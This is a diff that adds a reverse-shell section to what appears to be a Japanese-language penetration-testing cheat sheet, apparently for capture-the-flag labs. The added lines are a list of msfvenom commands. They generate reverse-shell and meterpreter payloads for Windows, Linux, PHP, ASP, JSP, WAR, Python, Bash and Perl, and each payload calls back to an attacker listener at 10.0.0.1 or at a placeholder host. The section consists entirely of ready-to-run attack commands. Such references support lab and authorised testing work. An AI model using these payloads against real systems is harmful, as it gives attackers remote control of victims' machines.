@@ -87,3 +87,51 @@ nmap -A -p- -Pn 10.10.10.3
 ### msfvenom_reverse_shell
 
 [CheetSheet](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)
+
+#### Windows(meterpreter)
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
+```
+#### Windows(netcatなど)
+```
+msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
+```
+
+#### Linux
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
+```
+
+#### PHP(msfvenom)
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Number> -f raw > reverse.php
+```
+
+#### ASP(msfvenom)
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
+```
+
+#### JSP(msfvenom)
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.jsp
+```
+
+#### WAR(msfvenom)
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > reverse.war
+```
+
+#### Python(msfvenom)
+```
+msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.py
+```
+#### Bash(msfvenom) 
+```
+msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.sh
+```
+#### Perl(msfvenom)
+```
+msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.pl
+```
